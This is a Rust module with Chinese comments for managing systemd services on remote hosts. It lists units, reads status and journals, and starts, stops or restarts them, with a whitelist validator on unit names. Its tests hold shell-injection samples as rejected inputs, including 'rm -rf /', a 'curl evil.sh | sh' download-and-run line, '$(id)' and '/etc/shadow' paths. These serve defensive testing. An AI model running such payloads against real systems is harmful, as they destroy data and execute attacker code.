//! 服务管理（M7.1）：`systemctl` 列表/状态/启停重启 + `journalctl` 看日志。
//!
//! 形状沿用 [`crate::monitor`] / [`crate::procs`]：**命令常量 + 纯函数解析**，网络与执行留在
//! app 层。好处是解析全部可单测，且容器 itest 能拿同一份命令跑真机对照。
//!
//! # 「没有 systemd」与「没有服务」是两种结果
//!
//! 非 systemd 的机器（Alpine 的 OpenRC、老 CentOS 的 SysV、容器里的裸 init）上 `systemctl`
//! 根本不存在。把它和「有 systemd 但一个服务都没列出来」压成同一个空列表，用户会盯着空表
//! 以为这台机器没跑任何服务——而真相是这个功能在这台机器上不适用。故命令首行输出探测标记，
//! 解析成 [`ServiceListResult`] 的两个变体。（同一条纪律见 [`crate::packages`] 的包管理器探测。）
//!
//! # 单元名是**不可信输入**
//!
//! 它从前端来，要拼进 shell 命令。`nginx; rm -rf /` 这种名字必须在拼串**之前**被拒，
//! 而不是指望引号能兜住——引号在不同 shell 下的行为不一致，而这条路是「用户点一下按钮就
//! 以远端身份执行任意命令」。[`validate_unit_name`] 是唯一入口，五个命令构造器都过它。

use serde::{Deserialize, Serialize};

/// 一个服务单元（`systemctl list-units --type=service` 的一行）。
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ServiceUnit {
    /// 单元名，含 `.service` 后缀。
    pub name: String,
    /// `loaded` / `not-found` / `masked` / `bad-setting`。
    pub load: String,
    /// `active` / `inactive` / `failed` / `activating` / `deactivating`。
    pub active: String,
    /// 子状态：`running` / `dead` / `exited` / `waiting`…
    pub sub: String,
    /// 人类可读描述（可能含空格，故是行尾剩余部分）。
    pub description: String,
}

/// 列表结果。两个变体的区分见模块头注。
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ServiceListResult {
    /// 这台机器上没有 `systemctl`——本功能不适用，不是「没有服务」。
    NoSystemd,
    /// 有 systemd；`units` 可能为空（那才是真的「没列出服务」）。
    Units { units: Vec<ServiceUnit> },
}

/// 单元名被拒的理由。**带上原名**便于用户看懂自己填了什么，但调用方不得把它拼回命令。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum UnitReject {
    Empty,
    TooLong,
    /// 含不允许的字符（位置从 0 起）。
    BadChar {
        at: usize,
        ch: char,
    },
}

impl std::fmt::Display for UnitReject {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            UnitReject::Empty => write!(f, "单元名不能为空"),
            UnitReject::TooLong => write!(f, "单元名超过 {UNIT_NAME_MAX} 字符"),
            UnitReject::BadChar { at, ch } => write!(
                f,
                "单元名第 {at} 个字符 {ch:?} 不允许（只接受字母、数字与 . _ - @ \\ : 这几种）"
            ),
        }
    }
}

/// 单元名长度上限。systemd 自己的上限是 255（含后缀），这里取同值。
pub const UNIT_NAME_MAX: usize = 255;

/// 单元名白名单校验。
///
/// **白名单而不是黑名单**：黑名单要穷举 shell 的元字符（`;|&$()<>\n\`` 反引号、换行、
/// 各种 IFS…），漏一个就是一次以远端身份执行任意命令。systemd 的单元名实际用到的字符很少，
/// 白名单短且完整：字母数字加 `. _ - @ \ :`（`@` 是模板实例 `getty@tty1.service`，
/// `\` 是转义过的路径单元 `dev-sda1.device`，`:` 出现在少数 slice/scope 名里）。
pub fn validate_unit_name(name: &str) -> Result<(), UnitReject> {
    if name.is_empty() {
        return Err(UnitReject::Empty);
    }
    if name.chars().count() > UNIT_NAME_MAX {
        return Err(UnitReject::TooLong);
    }
    for (at, ch) in name.chars().enumerate() {
        let ok = ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-' | '@' | '\\' | ':');
        if !ok {
            return Err(UnitReject::BadChar { at, ch });
        }
    }
    Ok(())
}

/// 探测标记：命令首行恒为 `SYSTEMD=0|1`，解析器据此分岔（见模块头注）。
const SYSTEMD_MARK: &str = "SYSTEMD=";

/// 服务列表命令。**只读**。
///
/// · `--type=service` 只要服务（socket/timer/mount 不在本功能范围）；
/// · `--all` 含 inactive——只列 active 的话用户看不到「本该在跑却停了」的那些，
///   而那恰恰是他打开这个面板的原因；
/// · `--plain --no-legend` 去掉表头装饰与脚注，只留数据行；
/// · `--no-pager` 防止 systemctl 挂 less 等一个永远不会来的按键（命令通道没有 TTY）。
pub fn list_services_command() -> &'static str {
    concat!(
        "if command -v systemctl >/dev/null 2>&1; then ",
        "echo SYSTEMD=1; ",
        "systemctl list-units --type=service --all --plain --no-legend --no-pager 2>/dev/null; ",
        "else echo SYSTEMD=0; fi"
    )
}

/// 解析 [`list_services_command`] 的 stdout。
///
/// 逐行按空白切 4 段 + 描述剩余部分；**列数不足的行直接跳过**而不是补空——systemctl 的
/// 行首可能有 `●`（失败单元的标记）之类的装饰字符，也可能混进警告行，把它们塞成半个单元
/// 会让界面上出现一行没有名字的东西。绝不 panic：输出来自远端，形状不可尽信。
pub fn parse_service_list(stdout: &str) -> ServiceListResult {
    let mut saw_systemd = None;
    let mut units = Vec::new();
    for line in stdout.lines() {
        let line = line.trim();
        if let Some(v) = line.strip_prefix(SYSTEMD_MARK) {
            saw_systemd = Some(v.trim() == "1");
            continue;
        }
        if saw_systemd != Some(true) || line.is_empty() {
            continue;
        }
        // 失败单元行首是 `●`（有些版本是 `*`）：剥掉再切列。
        let line = line.trim_start_matches(['●', '*']).trim_start();
        // 逐列取前四段、剩下的整段作描述。**不能用 `splitn(5, char::is_whitespace)`**：
        // systemctl 的表是**对齐**的，列间是连续空格，而 splitn 会把空片段也算进切分预算，
        // 五个名额在第一列后面就用光了（首版正是这样一行都解析不出来）。
        let mut rest = line;
        let mut cols: [&str; 4] = [""; 4];
        for c in cols.iter_mut() {
            let r = rest.trim_start();
            let end = r.find(char::is_whitespace).unwrap_or(r.len());
            *c = &r[..end];
            rest = &r[end..];
        }
        if cols.iter().any(|c| c.is_empty()) {
            continue;
        }
        units.push(ServiceUnit {
            name: cols[0].to_string(),
            load: cols[1].to_string(),
            active: cols[2].to_string(),
            sub: cols[3].to_string(),
            description: rest.trim().to_string(),
        });
    }
    match saw_systemd {
        Some(true) => ServiceListResult::Units { units },
        // 标记缺失（命令整体没跑起来）与显式 0 同样处理：本层只能诚实说「这里没有 systemd」，
        // 命令整体失败由 app 层看 exit code + stderr 另行报错。
        _ => ServiceListResult::NoSystemd,
    }
}

/// 单个单元的状态。**只读**，`--no-pager` 理由同上。
pub fn status_command(unit: &str) -> Result<String, UnitReject> {
    validate_unit_name(unit)?;
    Ok(format!(
        "systemctl status {unit} --no-pager --lines=0 2>&1 || true"
    ))
}

/// 单个单元的最近日志。**只读**。
///
/// `lines` 钳到 [`JOURNAL_LINES_MAX`]：日志走的是同一条 exec 通道，一次拉十万行会把
/// 整条通道堵住若干秒，而用户要的只是「最近出了什么事」。
pub fn journal_command(unit: &str, lines: u32) -> Result<String, UnitReject> {
    validate_unit_name(unit)?;
    let n = lines.clamp(1, JOURNAL_LINES_MAX);
    Ok(format!(
        "journalctl -u {unit} -n {n} --no-pager --output=short-iso 2>&1 || true"
    ))
}

/// 一次能拉的日志行数上限。
pub const JOURNAL_LINES_MAX: u32 = 2000;

/// 会改变系统状态的三个动作。
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ServiceAction {
    Start,
    Stop,
    Restart,
}

impl ServiceAction {
    /// systemctl 子命令名，也是审计与前端确认框里用的稳定串。
    pub fn as_str(self) -> &'static str {
        match self {
            ServiceAction::Start => "start",
            ServiceAction::Stop => "stop",
            ServiceAction::Restart => "restart",
        }
    }

    /// 这个动作会不会打断正在服务的连接（决定前端用哪一档确认类别）。
    pub fn is_disruptive(self) -> bool {
        matches!(self, ServiceAction::Stop | ServiceAction::Restart)
    }
}

/// 启/停/重启命令。
///
/// **不加 `sudo`**：命令通道 (`app/src/agent/exec_port.rs`) 走 `channel.exec()`，全程没有
/// `request_pty`，而 `sudo` 要 TTY 才能问密码——加上去只会必然失败，且失败信息是
/// 「sudo: a terminal is required」这种让用户以为程序坏了的话。权限不足时由
/// [`classify_action_failure`] 把真正的出路说出来。
pub fn action_command(action: ServiceAction, unit: &str) -> Result<String, UnitReject> {
    validate_unit_name(unit)?;
    Ok(format!("systemctl {} {unit}", action.as_str()))
}

/// 把一次失败的服务动作翻成**能行动**的一句话。
///
/// 返回 `None` = 本层看不出特定原因，调用方原样呈现 stderr。
pub fn classify_action_failure(exit_code: Option<i32>, stderr: &str) -> Option<String> {
    if exit_code == Some(0) {
        return None;
    }
    let e = stderr.to_ascii_lowercase();
    if e.contains("access denied")
        || e.contains("permission denied")
        || e.contains("interactive authentication required")
    {
        return Some(
            "权限不足：本程序的命令通道没有 TTY，`sudo` 在这条路上无法输入密码。\
             请用有权限的账号连接这台机器，或在目标机上为该账号配置免密（NOPASSWD）后重试。"
                .to_string(),
        );
    }
    if e.contains("not found") || e.contains("no such file") {
        return Some("这台机器上没有 systemctl（不是 systemd 系统），服务管理不适用。".to_string());
    }
    if e.contains("unit") && e.contains("not found") {
        return Some("找不到这个单元：它可能已被删除，或名字拼错了。".to_string());
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── 单元名校验：这是本模块唯一的安全边界 ────────────────────────────────

    #[test]
    fn ordinary_unit_names_pass() {
        for n in [
            "nginx.service",
            "getty@tty1.service",
            "dev-sda1.device",
            "systemd-journald.service",
            "docker.socket",
            "user-1000.slice",
            "a",
        ] {
            assert_eq!(validate_unit_name(n), Ok(()), "{n} 该通过");
        }
    }

    /// 每一个被拒的样本都是一次「点按钮 = 以远端身份执行任意命令」。
    #[test]
    fn shell_metacharacters_are_rejected() {
        for n in [
            "nginx; rm -rf /",
            "nginx && curl evil.sh | sh",
            "nginx|tee /etc/passwd",
            "$(id)",
            "`id`",
            "nginx\nsystemctl poweroff",
            "ng inx.service", // 空格切出第二个参数
            "ngi'nx",
            "ngi\"nx",
            "nginx>out",
            "../../etc/shadow",
        ] {
            assert!(
                validate_unit_name(n).is_err(),
                "{n:?} 必须被拒——它拼进命令就是一次注入"
            );
        }
    }

    #[test]
    fn empty_and_overlong_are_rejected() {
        assert_eq!(validate_unit_name(""), Err(UnitReject::Empty));
        let long = "a".repeat(UNIT_NAME_MAX + 1);
        assert_eq!(validate_unit_name(&long), Err(UnitReject::TooLong));
        assert_eq!(validate_unit_name(&"a".repeat(UNIT_NAME_MAX)), Ok(()));
    }

    #[test]
    fn every_command_builder_validates() {
        let bad = "nginx; id";
        assert!(status_command(bad).is_err());
        assert!(journal_command(bad, 10).is_err());
        for a in [
            ServiceAction::Start,
            ServiceAction::Stop,
            ServiceAction::Restart,
        ] {
            assert!(action_command(a, bad).is_err(), "{a:?} 漏了校验");
        }
    }

    // ── 列表解析 ────────────────────────────────────────────────────────────

    #[test]
    fn no_systemd_is_not_an_empty_list() {
        assert_eq!(
            parse_service_list("SYSTEMD=0\n"),
            ServiceListResult::NoSystemd
        );
        // 有 systemd 但一个都没列出来 → 空列表，**不是** NoSystemd
        assert_eq!(
            parse_service_list("SYSTEMD=1\n"),
            ServiceListResult::Units { units: vec![] }
        );
    }

    #[test]
    fn parses_a_real_systemctl_table() {
        let out = "SYSTEMD=1\n\
             cron.service            loaded active   running Regular background program processing daemon\n\
             ssh.service             loaded active   running OpenBSD Secure Shell server\n\
             nginx.service           loaded inactive dead    A high performance web server\n\
           ● postfix.service         loaded failed   failed  Postfix Mail Transport Agent\n";
        let ServiceListResult::Units { units } = parse_service_list(out) else {
            panic!("应解析成 Units");
        };
        assert_eq!(units.len(), 4);
        assert_eq!(units[0].name, "cron.service");
        assert_eq!(units[0].active, "active");
        assert_eq!(units[0].sub, "running");
        assert_eq!(
            units[0].description,
            "Regular background program processing daemon"
        );
        // 行首的 ● 是「这个单元出问题了」的装饰，不属于名字
        assert_eq!(units[3].name, "postfix.service");
        assert_eq!(units[3].active, "failed");
    }

    /// 列数不足的行跳过而不是补空——半个单元在界面上是一行没有名字的东西。
    #[test]
    fn short_lines_are_skipped_not_half_parsed() {
        let out = "SYSTEMD=1\nWarning: something\nok.service loaded active running Desc\n";
        let ServiceListResult::Units { units } = parse_service_list(out) else {
            panic!()
        };
        assert_eq!(units.len(), 1);
        assert_eq!(units[0].name, "ok.service");
    }

    /// 描述里有多个空格时不能被切碎（`splitn(5)` 的意义）。
    #[test]
    fn description_keeps_its_spaces() {
        let out = "SYSTEMD=1\na.service loaded active running  A  b   c \n";
        let ServiceListResult::Units { units } = parse_service_list(out) else {
            panic!()
        };
        assert_eq!(units[0].description, "A  b   c");
    }

    // ── 命令构造 ────────────────────────────────────────────────────────────

    #[test]
    fn commands_are_non_interactive() {
        // 命令通道没有 TTY：任何会挂 pager 的命令都会把通道堵到超时
        assert!(list_services_command().contains("--no-pager"));
        assert!(status_command("a.service").unwrap().contains("--no-pager"));
        assert!(journal_command("a.service", 50)
            .unwrap()
            .contains("--no-pager"));
    }

    #[test]
    fn action_command_has_no_sudo() {
        // 加 sudo 只会必然失败，且报「a terminal is required」这种让人以为程序坏了的话
        for a in [
            ServiceAction::Start,
            ServiceAction::Stop,
            ServiceAction::Restart,
        ] {
            let c = action_command(a, "nginx.service").unwrap();
            assert!(!c.contains("sudo"), "{c}");
            assert!(c.starts_with("systemctl "), "{c}");
        }
    }

    #[test]
    fn journal_lines_are_clamped() {
        assert!(journal_command("a.service", 0).unwrap().contains("-n 1"));
        assert!(journal_command("a.service", 999_999)
            .unwrap()
            .contains(&format!("-n {JOURNAL_LINES_MAX}")));
        assert!(journal_command("a.service", 50).unwrap().contains("-n 50"));
    }

    #[test]
    fn only_stop_and_restart_are_disruptive() {
        assert!(!ServiceAction::Start.is_disruptive());
        assert!(ServiceAction::Stop.is_disruptive());
        assert!(ServiceAction::Restart.is_disruptive());
    }

    // ── 失败归因 ────────────────────────────────────────────────────────────

    #[test]
    fn permission_failures_point_at_the_real_way_out() {
        let m = classify_action_failure(Some(1), "Failed to restart nginx.service: Access denied")
            .expect("应识别为权限问题");
        assert!(m.contains("NOPASSWD"), "{m}");
        assert!(m.contains("TTY"), "{m}");
        let m2 = classify_action_failure(Some(1), "Interactive authentication required.").unwrap();
        assert!(m2.contains("权限不足"), "{m2}");
    }

    #[test]
    fn success_is_not_classified_as_a_failure() {
        assert_eq!(classify_action_failure(Some(0), ""), None);
    }

    #[test]
    fn unknown_failures_fall_through_to_raw_stderr() {
        assert_eq!(
            classify_action_failure(
                Some(5),
                "Job for nginx.service failed; see 'journalctl -xe'"
            ),
            None
        );
    }
}
